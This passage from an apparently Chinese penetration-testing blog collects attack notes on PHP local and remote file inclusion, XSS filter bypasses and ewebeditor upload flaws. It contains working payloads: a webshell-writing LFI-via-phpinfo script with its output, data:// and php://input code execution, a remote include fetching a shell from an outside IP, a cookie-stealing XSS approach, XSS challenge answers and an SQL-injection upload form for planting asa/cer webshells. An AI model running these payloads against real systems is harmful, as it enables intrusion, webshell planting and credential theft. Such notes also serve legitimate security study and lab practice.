<li><p>3 利用/proc/self/environ目录遍历及远程执行代码的漏洞</p>
<ul>
<li><p><code>http://pnig0s1992.blog.51cto.com/393390/400182</code></p>
</li>
<li><p>Exploiting LFI to RCE /proc/self/environ with burpsuite:</p>
<p><code>https://youtu.be/dlh0ogYy9ys</code></p>
</li>
</ul>
</li>
</ul>
<h4 id="2-3-2-包含session文件"><a href="#2-3-2-包含session文件" class="headerlink" title="2.3.2-包含session文件"></a>2.3.2-包含session文件</h4><ul>
<li>php保存格式——sess_SESSIONID </li>
<li>默认位置是<ul>
<li>/tmp/(PHP Sessions)、</li>
<li>/var/lib/php/session/(PHP Sessions)、</li>
<li>/var/lib/php5/(PHP Sessions) </li>
<li>和c:/windows/temp/(PHP Sessions)等文件中。</li>
</ul>
</li>
<li>需要在session文件中有可控的部分。</li>
<li>session文件一般在/tmp目录下，格式为sess_[phpsessid],</li>
</ul>
<h4 id="2-3-3-包含由其它php创建的tmp文件"><a href="#2-3-3-包含由其它php创建的tmp文件" class="headerlink" title="2.3.3-包含由其它php创建的tmp文件"></a>2.3.3-包含由其它php创建的tmp文件</h4><ul>
<li><p>利用LFI和phpinfo getshell<br>利用条件：</p>
<ul>
<li>需要知道phpinfo路径；</li>
<li>网站存在文件包含漏洞；</li>
<li>需要有Web目录的写入权限</li>
</ul>
</li>
<li><p>我们知道在向服务器上任意php文件post请求上传数据时，都会生成临时文件，我们可以在临时文件删除之前包含临时文件来生成Webshell，可以phpinfo页面找到临时文件的路径及名字。</p>
</li>
<li><p>利用脚本如下：</p>
<ul>
<li><p><a href="https://github.com/hxer/vulnapp/blob/master/lfi_phpinfo/poc/lfi_phpinfo.py" target="_blank" rel="noopener">https://github.com/hxer/vulnapp/blob/master/lfi_phpinfo/poc/lfi_phpinfo.py</a></p>
</li>
<li><p>需要修改三处：</p>
<ul>
<li>Webshell的位置<br><code>payload += &#39;&lt;?php $c=fopen(&quot;./shell.php&quot;, &quot;w&quot;);fwrite($c, \&#39;&lt;?php passthru($_GET[“f”]);?&gt;\&#39;);?&gt;&#39;</code><br>这里生成在当前目录下</li>
<li>phpinfo文件的位置<br><code>req = &#39;POST {path}/phpinfo.php?a={padding} HTTP/1.1\r\n&#39;.format(path=php_path, padding=padding)</code></li>
<li>文件包含文件的位置<br><code>lfi_req = &#39;GET {path}/post.php?file=%s HTTP/1.1\r\n&#39;.format(path=php_path)</code></li>
</ul>
</li>
<li><p>然后执行Python文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@vincent tmp]# python lfi.py 127.0.0.1 -p 8080</span><br><span class="line">LFI with phpinfo()</span><br><span class="line">==============================</span><br><span class="line">INFO:__main__:Getting initial offset …</span><br><span class="line">INFO:__main__:found [tmp_name] at 162448</span><br><span class="line">INFO:__main__:</span><br><span class="line">Got it! Shell created in /tmp/g</span><br><span class="line">INFO:__main__:Wowo! \m/</span><br><span class="line">INFO:__main__:Shutting down…</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后看一下生成<br><code>[root@vincent tmp]# cat /var/www/html/shell.php</code></p>
</li>
</ul>
</li>
<li><p>上传一个文件的过程,可以在tmp那里包含：</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-21/50980359.jpg" alt></p>
</li>
<li><p>本地测试</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-21/43602449.jpg" alt></p>
</li>
<li><p>链家旗下自如某站一个有意思的文件包含到简单内网渗透（本地文件包含getshell技巧）：<br><code>http://www.wooyun.org/bugs/wooyun-2015-0134185</code></p>
</li>
</ul>
<h3 id="2-4-本地包含小姿势"><a href="#2-4-本地包含小姿势" class="headerlink" title="2.4-本地包含小姿势"></a>2.4-本地包含小姿势</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">审计中可见这样的包含模版文件：</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">"inc/"</span> . $_GET[<span class="string">'file'</span>] . <span class="string">".htm"</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>%00截断<ul>
<li>/etc/passwd%00</li>
<li>(需要 magic_quotes_gpc=off，PHP小于5.3.4有效)</li>
</ul>
</li>
<li>%00截断目录遍历<ul>
<li>/var/www/%00</li>
<li>(需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)</li>
</ul>
</li>
<li>路径长度截断<ul>
<li>/etc/passwd/././././././.[…]/./././././.</li>
<li>(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)</li>
</ul>
</li>
<li>点号截断<ul>
<li>/boot.ini/………[…]…………</li>
<li>(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)</li>
</ul>
</li>
</ul>
<h2 id="03-远程包含及常见封装协议"><a href="#03-远程包含及常见封装协议" class="headerlink" title="03-远程包含及常见封装协议"></a>03-远程包含及常见封装协议</h2><h3 id="3-1-远程代码执行"><a href="#3-1-远程代码执行" class="headerlink" title="3.1-远程代码执行"></a>3.1-远程代码执行</h3><ul>
<li><code>?file=[http|https|ftp]://example.com/shell.txt</code></li>
<li>要求：<ul>
<li>需要allow_url_fopen=On并且 allow_url_include=On；</li>
<li>二者需要在php.ini中设置，而非apache配置文件；</li>
<li>二者需要同时启用，缺一不可，要求比较高；</li>
</ul>
</li>
<li>eg：<br><code>http://127.0.0.1/test/1.php?f=http://118.89.53.92/test/222.txt</code></li>
</ul>
<h3 id="3-2-php-input-命令执行"><a href="#3-2-php-input-命令执行" class="headerlink" title="3.2-php://input 命令执行"></a>3.2-php://input 命令执行</h3><ul>
<li><p><code>?file=php://input</code></p>
</li>
<li><p>对于php://input介绍，PHP官方手册文档有一段话对它进行了很明确地概述：</p>
<p><code>“php://input allows you to read raw POST data. It is a less memory intensive alternative to $HTTP_RAW_POST_DATA and does not need any special php.ini directives. php://input is not available with enctype=”multipart/form-data”.</code></p>
</li>
<li><p>翻译过来，是这样：</p>
<p><code>“php://input可以读取没有处理过的POST数据。相较于$HTTP_RAW_POST_DATA而言，它给内存带来的压力较小，并且不需要特殊的php.ini设置。php://input不能用于enctype=multipart/form-data”</code></p>
</li>
<li><p>要求</p>
<ul>
<li>只需要allow_url_include=On</li>
<li>allow_url_fopen开启与否无关；</li>
</ul>
</li>
<li><p>图示：</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-20/82649660.jpg" alt></p>
</li>
<li><p>利用文件包含来进行代码执行</p>
<ul>
<li>post的php代码会被执行；</li>
<li>比较鸡肋，因为此allow_url_include=On，如果allow_url_fopen=On，直接远程包含，getshell；</li>
</ul>
</li>
<li><p>参考：<a href="https://www.chabug.org/p/36.html" target="_blank" rel="noopener">https://www.chabug.org/p/36.html</a></p>
</li>
</ul>
<h3 id="3-3-利用php流filter-过滤器）"><a href="#3-3-利用php流filter-过滤器）" class="headerlink" title="3.3-利用php流filter(过滤器）"></a>3.3-利用php流filter(过滤器）</h3><ul>
<li><p>形式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include.php?file=php://filter/convert.base64-encode/resource=upload</span><br><span class="line">include.php?file=php://filter/read=convert.base64-encode/resource=upload;</span><br><span class="line">include.php?file=php://filter/string.rot13/resource=upload</span><br><span class="line">include.php?file=php://filter/read=string.rot13/resource=upload</span><br></pre></td></tr></table></figure>
<ul>
<li>注：<ul>
<li>read=可有可无；</li>
<li>base64解码或rot13解码即可得源码；</li>
<li>最好使用base64的形式，rot13可能失败；</li>
</ul>
</li>
</ul>
</li>
<li><p>要求：</p>
<ul>
<li><p>都不需要开启；</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-20/88684423.jpg" alt></p>
</li>
</ul>
</li>
</ul>
<h3 id="3-4-data-URIs-命令执行"><a href="#3-4-data-URIs-命令执行" class="headerlink" title="3.4-data URIs 命令执行"></a>3.4-data URIs 命令执行</h3><ul>
<li><p>文件包含漏洞中利用data:协议将LFI变为代码执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+</span><br><span class="line">file=data://text/plain,&lt;?php system(&apos;cat /etc/passwd&apos;);?&gt;</span><br><span class="line">(后面是PD9waHAgcGhwaW5mbygpOz8+的base64编码，(需要allow_url_include=On)）</span><br></pre></td></tr></table></figure>
</li>
<li><p>如，<code>172.16.100.168:8080/post.php?file=data:text/plain,&lt;?php system(&#39;cat /etc/passwd&#39;);?&gt;</code></p>
</li>
<li><p>需要allow_url_include=On</p>
</li>
<li><p>Data URI的格式规范,</p>
<p><code>data:[&lt;mime type&gt;][;charset=&lt;charset&gt;][;&lt;encoding&gt;],&lt;encoded data&gt;</code></p>
<ul>
<li>data ：协议名称；</li>
<li><code>[&lt;mime type&gt;]</code>：可选项，数据类型（image/png、text/plain等）</li>
<li><code>[;charset=&lt;charset&gt;]</code>：可选项，源文本的字符集编码方式</li>
<li><code>[;&lt;encoding&gt;]</code>：数据编码方式（默认US-ASCII，BASE64两种）</li>
<li>,<code>&lt;encoded data&gt;</code>：编码后的数据</li>
</ul>
</li>
</ul>
<h3 id="3-5-zip协议"><a href="#3-5-zip协议" class="headerlink" title="3.5-zip协议"></a>3.5-zip协议</h3><ul>
<li><p>协议原型：zip://archive.zip#dir/file.txt</p>
<ul>
<li><code>http://php.net/manual/zh/wrappers.compression.php</code></li>
<li>注意url编码,因为这个#会和url协议中的#冲突</li>
</ul>
</li>
<li><p>测试代码1：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$file = $_GET[<span class="string">'f'</span>];</span><br><span class="line">	<span class="keyword">echo</span> $file;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">	<span class="keyword">include</span>($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>新建1.php，内容为：</p>
<p><code>&lt;?php phpinfo();?&gt;</code></p>
</li>
<li><p>压缩为1.zip；</p>
</li>
<li><p>url为：<br><code>http://127.0.0.1/test/1.php?f=zip://1.zip%231.php</code><br>或<code>http://127.0.0.1/test/1.php?f=zip://1.jpg#1.php</code></p>
</li>
<li><p>注：</p>
<ul>
<li>以#为分隔，前面为路径及名称，后面为压缩包内文件名称,；</li>
<li><code>#</code>最好%23，以免与url中#冲突；（实测中#会失败，%23成功）</li>
<li>1.zip改为1.jpg后，包含依然成功，无影响（图片后缀方便上传）</li>
</ul>
</li>
</ul>
</li>
<li><p>测试代码2：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$file=$_GET[<span class="string">'f'</span>];</span><br><span class="line">	<span class="keyword">if</span> ( <span class="keyword">isset</span>( $file ) &amp;&amp; strtolower( substr( $file, <span class="number">-4</span> ) ) == <span class="string">".php"</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">print</span> $file;</span><br><span class="line">		<span class="keyword">require</span>( $file );</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//截取过来的后面4格字符,判断是不是php,如果是php才进行包含；</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>1.php-&gt;phpinfo()-&gt;.zip-&gt;zip://xxx/xxx/.zip%231.php</code></li>
<li><code>http://127.0.0.1/test/1.php?f=zip://1.zip%231.php</code></li>
<li><code>或http://127.0.0.1/test/1.php?f=zip://1.jpg%231.php</code></li>
<li>步骤：<ul>
<li>首先新建一个1.php 里面随便写个&lt;?php phpinfo();?&gt;</li>
<li>然后压缩成.zip 然后把zip的名字改成 1.jpg（为了突破上传）</li>
<li>然后把这个.jpg上传上去 然后包含</li>
</ul>
</li>
</ul>
</li>
<li><p>测试代码3</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file = $_GET[<span class="string">'f'</span>];</span><br><span class="line">	<span class="keyword">print</span> $file.<span class="string">".jpg"</span>;</span><br><span class="line">    <span class="keyword">include</span>($file.<span class="string">".jpg"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//强制在后面加.jpg；</span></span><br></pre></td></tr></table></figure>
<ul>
<li>思路同上</li>
<li>只不过将php后缀改成jpg后缀，再压缩；<br>因为最终会拼接上.jpg后缀；<br>包含时不论后缀如何，只要内容为php形式</li>
<li>url为<ul>
<li><code>http://127.0.0.1/test/1.php?f=zip://2.zip%232</code></li>
<li><code>或http://127.0.0.1/test/1.php?f=zip://2.jpg%232</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="3-6-phar协议"><a href="#3-6-phar协议" class="headerlink" title="3.6-phar协议"></a>3.6-phar协议</h3><ul>
<li>除了zip协议，还有phar协议也可以做到类似的事情</li>
<li>参考：<a href="http://php.net/manual/zh/wrappers.phar.php" target="_blank" rel="noopener">http://php.net/manual/zh/wrappers.phar.php</a></li>
<li>基本上和zip差不多，区别就是phar://php.zip/php.jpg中是用/来分隔而不是#。</li>
<li>注意：<ul>
<li>php版本需大于PHP 5.3.0，phar:// 数据流包装器自 PHP 5.3.0 起开始有效（但phpstudy中5.3.29失败）</li>
<li>php代码创建phar的时候要注意php.ini的参数,phar.readonly设置为off（包含时不需要）</li>
<li>同zip大同小异，分隔符不同，且/不强制url编码，zip中#最好%23，以免与url中#冲突</li>
</ul>
</li>
</ul>
<h3 id="3-7-简要总结"><a href="#3-7-简要总结" class="headerlink" title="3.7-简要总结"></a>3.7-简要总结</h3><ul>
<li>从PHP5.2开始allow_url_include就默认为Off了，而allow_url_fopen一直是On的</li>
<li>远程文件包含——两者都需要on；</li>
<li>input——include为on；</li>
<li>data——include 为on；</li>
<li>filter——都不需要；</li>
<li>zip/phar——不需要；</li>
</ul>
<h2 id="04-工具及防御"><a href="#04-工具及防御" class="headerlink" title="04-工具及防御"></a>04-工具及防御</h2><ul>
<li>工具：<br><code>https://github.com/P0cL4bs/Kadimus/</code></li>
<li>防御：<br>php.ini中设置open_basedir</li>
</ul>
<h2 id="05-其它文章"><a href="#05-其它文章" class="headerlink" title="05-其它文章"></a>05-其它文章</h2><ul>
<li>PHP文件包含漏洞总结：<code>http://wiki.wooyun.org/web:lfi</code></li>
</ul>
<ul>
<li><p>文件包含与注入利用总结：</p>
<p><code>http://drops.wooyun.org/tips/3827</code></p>
<p> <code>https://www.91ri.org/2736.html</code></p>
</li>
<li><p>php://input，php://filter，data URI schema的那些事：</p>
<p><code>https://www.91ri.org/7470.html</code></p>
</li>
<li><p>phar协议：</p>
<p><code>https://www.91ri.org/13363.html</code></p>
</li>
<li><p>论PHP常见的漏洞：</p>
<p><code>http://drops.wooyun.org/papers/4544</code></p>
</li>
<li><p>LFI WITH PHPINFO() ASSISTANCE：</p>
<p><code>https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf</code></p>
</li>
<li><p>PHP_LFI_rfc1867_temporary_files：</p>
<p><code>http://gynvael.coldwind.pl/download.php?f=PHP_LF</code>I_rfc1867_temporary_files.pdf</p>
</li>
<li><p>zip或phar协议包含文件</p>
<p><code>http://bl4ck.in/index.php/tricks/use-zip-or-phar-to-include-file.html</code></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Web安全/渗透</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS漏洞</title>
    <url>/2018/01/22/web/XSS%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="XSS相关"><a href="#XSS相关" class="headerlink" title="XSS相关"></a>XSS相关</h1><h2 id="01-xss简介"><a href="#01-xss简介" class="headerlink" title="01-xss简介"></a>01-xss简介</h2><ul>
<li><p>简单分类：</p>
<ul>
<li>反射型（非持续型，地址本不存在，需要攻击者自己构造）</li>
<li>存储型（持续性，多出现在留言板，评论等场景，危害较前者大）</li>
<li>DOM型</li>
</ul>
</li>
<li><p>利用：</p>
<ul>
<li>可自己写代码搭建攻击平台（见后面cookie接受页面编写）</li>
<li>也借助网上在线xss平台（如sss中xss平台）</li>
</ul>
</li>
</ul>
<a id="more"></a>
<ul>
<li><p>工具使用：</p>
<ul>
<li>kali上xss利用神器Beef的使用</li>
<li>beef与msf的结合</li>
</ul>
</li>
<li><p>简单的cookie接受脚本编写（思路）</p>
<ul>
<li><p>触发端语句：<br><code>http://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=&lt;script&gt;window.open(“http://127.0.0.1/cookie/xss.html”);&lt;/script&gt;</code>(可设置打开页面属性，不可见)</p>
</li>
<li><p>触发端页面</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-20/41262893.jpg" alt></p>
</li>
<li><p>接受端语句</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-20/37723479.jpg" alt></p>
</li>
<li><p>通过跨站漏洞，访问特定页面，获取cookie发送至服务端进行接受处理</p>
</li>
<li><p>Xss接受cookie页面编程实现：</p>
<ul>
<li>获取当前url地址</li>
<li>获取当前url地址下的cookie</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="02-跨站的过滤及绕过"><a href="#02-跨站的过滤及绕过" class="headerlink" title="02-跨站的过滤及绕过"></a>02-跨站的过滤及绕过</h2><ul>
<li>过滤机制：过滤关键字，字符实例化（把&lt;或&gt;实例化编码等），限制长度</li>
<li>绕过：大小写，关键字替换，编码，</li>
</ul>
<ol>
<li><p>过滤<script>或其它关键字（php代码中正则过滤）</p>
<ul>
<li><p>code</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-20/18900612.jpg" alt=""></p>
</li>
<li><p>绕过：大小写绕过</p>
</li>
</ul>
</li>
<li><p>过滤<script>关键字（正则中加i参数，不考虑大小写）</p>
<ul>
<li><p>code</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-20/19210410.jpg" alt=""></p>
</li>
<li><p>绕过：</p>
<ul>
<li>大小写无法绕过，因为i参数不考虑大小写，使用其他语句来调用js语句</li>
<li>如：<br><code>&lt;IMG SRC=&quot;&quot; onerror=&quot;alert(&#39;XSS&#39;)&quot;&gt;</code></li>
<li>图片没有指定，也就是出错了。Onerror 这个事件就会出发。引发 XSS 漏洞，没有用<script> 标签。 </li>
</ul>
</li>
</ul>
</li>
<li><p>过滤alert关键字，并不考虑大小写，一并过滤</p>
<ul>
<li><p>code</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-20/61762998.jpg" alt=""></p>
</li>
<li><p>绕过</p>
<ul>
<li>使用JavaScript中的fromCharCode绕过（fromCharCode() 可接受一个指定的 Unicode 值，然后返回一个字符串，如<code>String.fromCharCode(65,66,67)返回ABC）</code></li>
<li><code>&lt;IMG SRC=&quot;&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&quot;&gt;</code></li>
<li>（利用小葵字符串转为ascii，将alert(1)转为97,108,101,114,116,40,49,41；注意String.fromCharCode的大小写问题）</li>
</ul>
</li>
</ul>
</li>
<li><p>变量接受封装过滤</p>
<ul>
<li><p>code</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-20/54047519.jpg" alt=""></p>
</li>
<li><p>绕过：</p>
<ul>
<li><p>使其php代码失效，组合语句，重定向</p>
</li>
<li><p>失败的原因将输入的内容都放置在一个变量；成功的原因输入内容放在两个变量，并执行代码）</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-20/87117925.jpg" alt=""></p>
</li>
<li><p>eval在js和PHP中同样用来执行语句；js中声明变量有var关键字，没$</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-20/35911443.jpg" alt=""></p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>实例化过滤</p>
<ul>
<li>htmlentities函数</li>
<li>把字符转换为 HTML 实体</li>
</ul>
</li>
</ol>
<h2 id="03-xss过关游戏"><a href="#03-xss过关游戏" class="headerlink" title="03-xss过关游戏"></a>03-xss过关游戏</h2><blockquote>
<p><a href="http://blog.icxun.cn/Note/308.html">http://blog.icxun.cn/Note/308.html</a><br><a href="https://xianzhi.aliyun.com/forum/read/1462.html?displayMode=1&amp;u=1338784901396718">https://xianzhi.aliyun.com/forum/read/1462.html?displayMode=1&amp;u=1338784901396718</a></p>
</blockquote>
<ol>
<li><p><code>&lt;script&gt;alert()&lt;/script&gt;</code></p>
</li>
<li><p><code>1&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;</code></p>
</li>
<li><p>事件调用<br><code>1&#39; oninput=&#39;alert()&#39; &#39;</code></p>
</li>
<li><p>a标签调用，超链接</p>
<p><code>123&quot;&gt; &lt;a href=&quot;JavaScript:alert();&quot;&gt;123&lt;/a&gt;</code></p>
</li>
<li><p>大小写绕过</p>
<p><code>&lt;input name=keyword  value=&quot;123&quot;&gt; &lt;Script&gt;alert()&lt;/script&gt;//&quot;&gt;123&quot;&gt; &lt;Script&gt;alert()&lt;/script&gt;//</code></p>
</li>
<li><p>重复</p>
<p><code>123&quot;&gt;&lt;scscriptript&gt;alert()&lt;/scscriptript&gt;//</code></p>
</li>
<li><p>a标签超链接，html实体编码，url编码</p>
<p><code>%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116;:alert();</code></p>
</li>
<li><p><code>%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116;:alert(&#39;http://&#39;);</code></p>
<p>或者用`或者用实体编码</p>
</li>
<li><p>利用referer字段</p>
<p><code>&lt;input name=&quot;t_ref&quot;  value=&quot;123&quot; &gt;&lt;script&gt;alert()&lt;/script&gt;//&quot; type=&quot;hidden&quot;&gt;</code></p>
</li>
<li><p>注意iframe标签</p>
<ul>
<li>F12firebug，输入点在iframe</li>
<li>xsspayload上传到自己服务器</li>
<li>src包含</li>
</ul>
</li>
<li><p><code>http://127.0.0.1/1/xss/level16.php?keyword=&lt;img%0asrc=&#39;x&#39;%0aonerror=alert()&gt;</code></p>
<ul>
<li>过滤空格，script，/</li>
<li>img标签，%0a，%0d突破空格</li>
</ul>
</li>
<li><p>尖括号被过滤，利用事件</p>
</li>
<li><p><code>http://127.0.0.1/1/xss/level17.php?arg01=a111&amp;arg02=111 onfocus=alert(2)</code></p>
</li>
<li><p>过滤尖括号: 利用事件onfocus</p>
<ul>
<li><code>&lt;input name=&quot;t_sort&quot;  value=&quot;123&quot; onfocus=alert() type=&quot;text&quot; type=&quot;hidden&quot;&gt;</code></li>
<li><code>http://127.0.0.1/1/xss/level10.php?keyword=&lt;script&gt;alert()&lt;/script&gt;&amp;t_link=123t_history=123&amp;t_sort=123&quot; onfocus=alert() type=&quot;text</code></li>
</ul>
</li>
<li><p>利用ua字段，利用cookie字段</p>
</li>
</ol>
</script></p></li></ol>]]></content>
      <categories>
        <category>Web安全/渗透</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>编辑器上传漏洞</title>
    <url>/2018/01/22/web/%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="编辑器上传相关"><a href="#编辑器上传相关" class="headerlink" title="编辑器上传相关"></a>编辑器上传相关</h1><blockquote>
<p><a href="http://lovexiaofeng.cn/2016/07/27/19/" target="_blank" rel="noopener">http://lovexiaofeng.cn/2016/07/27/19/</a></p>
</blockquote>
<ul>
<li>常见编辑器：<ul>
<li>ewebeditor</li>
<li>SouthidcEditor</li>
<li>fckeditor</li>
<li>CuteEditor</li>
<li>freetextbox</li>
</ul>
</li>
</ul>
<a id="more"></a>
<h2 id="01-ewebeditor编辑器"><a href="#01-ewebeditor编辑器" class="headerlink" title="01-ewebeditor编辑器"></a>01-ewebeditor编辑器</h2><ul>
<li><p>默认后台:</p>
<ul>
<li><code>http://127.0.0.1/ewebeditor/admin_login.asp</code></li>
<li><code>http://127.0.0.1/ewebeditor/admin/login.asp</code></li>
</ul>
</li>
<li><p>默认数据库：</p>
<ul>
<li><code>http://127.0.0.1/ewebeditor/db/ewebeditor.mdb</code></li>
<li><code>http://127.0.0.1/ewebeditor/db/%23ewebeditor.mdb</code></li>
</ul>
</li>
<li><p>有一个版本的密码是在配置文件中</p>
<p><a href="http://127.0.0.1/ewebeditor/admin/config.asp" target="_blank" rel="noopener">http://127.0.0.1/ewebeditor/admin/config.asp</a></p>
</li>
<li><p>进入编辑器，上传asa或者asp，得到webshell，也可以本地构造一个html进行上传</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">”http://127.0.0.1/ewebditor/upload.asp?action</span>=<span class="string">save&amp;type</span>=<span class="string">&amp;style</span>=<span class="string">样式名”</span> <span class="attr">method</span>=<span class="string">post</span> <span class="attr">name</span>=<span class="string">myform</span> <span class="attr">enctype</span>=<span class="string">”multipart/form-data”</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">file</span> <span class="attr">name</span>=<span class="string">uploadfile</span> <span class="attr">size</span>=<span class="string">1</span> <span class="attr">style</span>=<span class="string">”width:100%”</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">”上传了”</span>&gt;</span><span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li><p>利用：</p>
<ul>
<li>后台如果能进入</li>
<li>可点击样式管理</li>
</ul>
</li>
<li><p>standard 拷贝一份(直接修改改不了名字可以随便)<br>在拷贝的一份里加入图片类型( asa cer aaspsp )，然后点预览，在编辑器里点设计，然后直接上传asa大马，上传后，右键查看源代码就可以看到OO的位置!<br>(原理:因为在iis里 网站的属性里 应用程序配置一项 asa扩展名还是用asp.dll来解析的,asp也是,还有cer/cdx)</p>
</li>
</ul>
<ul>
<li><p>.net ewebeditor 漏洞利用</p>
<ul>
<li><p>默认上传地址:<br><code>http://127.0.0.1/ewebeditor/upload.aspx</code></p>
</li>
<li><p>直接上传一个cer的木马，在无法上传的情况下，可以地址栏构造以下代码:</p>
<p>javascript:lbtnUpload.click();</p>
</li>
<li><p>然后查看源代码，找到uploadsave，找到OO地址，默认传到uploadfile这个文件夹里</p>
</li>
<li><p>(漏洞修补: 可以在iis里直接把upload文件夹的执行权限设置为无. )</p>
</li>
</ul>
</li>
<li><p>jsp版 ewebeditor 漏洞利用</p>
<ul>
<li><a href="http://127.0.0.1/ewebeditor/upload.jsp" target="_blank" rel="noopener">http://127.0.0.1/ewebeditor/upload.jsp</a></li>
<li>说明：jsp版的没做文件过滤，直接选择个jsp马 然后回车 右键查看源代码即可</li>
</ul>
</li>
<li><p>ewebeditor asp版 2.1.6 上传漏洞利用程序</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/ewebeditor/upload.asp?action=save&amp;type=IMAGE&amp;style=standard' &lt;SPAN style="</span><span class="attr">COLOR:</span> #<span class="attr">ff0000</span>"&gt;</span>and 1=2<span class="tag">&lt;/<span class="name">SPAN</span>&gt;</span> union select S_ID,S_Name,S_Dir,S_CSS,'<span class="tag">&lt;<span class="name">SPAN</span> <span class="attr">style</span>=<span class="string">"COLOR: #ff0000"</span>&gt;</span>UploadFile'<span class="tag">&lt;/<span class="name">SPAN</span>&gt;</span>,S_Width,S_Height,S_Memo,S_IsSys,[S_FileExt]%2b'|cer' ,S_FlashExt,[<span class="tag">&lt;<span class="name">SPAN</span> <span class="attr">style</span>=<span class="string">"COLOR: #ff0000"</span>&gt;</span>S_ImageExt]%2b'|asa',<span class="tag">&lt;/<span class="name">SPAN</span>&gt;</span>S_MediaExt,S_FileSize,S_FlashSize,S_ImageSize,S_MediaSize,S_StateFlag,S_DetectFromWord,S_InitMode,S_BaseUrl from ewebeditor_style where s_name='standard'and'a'='a" method=post name=myform enctype="multipart/form-data"&gt; </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">file</span> <span class="attr">name</span>=<span class="string">uploadfile</span> <span class="attr">size</span>=<span class="string">100</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">Fuck</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="02-ewebeditor-PHP3-8-0day"><a href="#02-ewebeditor-PHP3-8-0day" class="headerlink" title="02-ewebeditor PHP3.8 0day"></a>02-ewebeditor PHP3.8 0day</h2><ul>
<li><p>code</p>
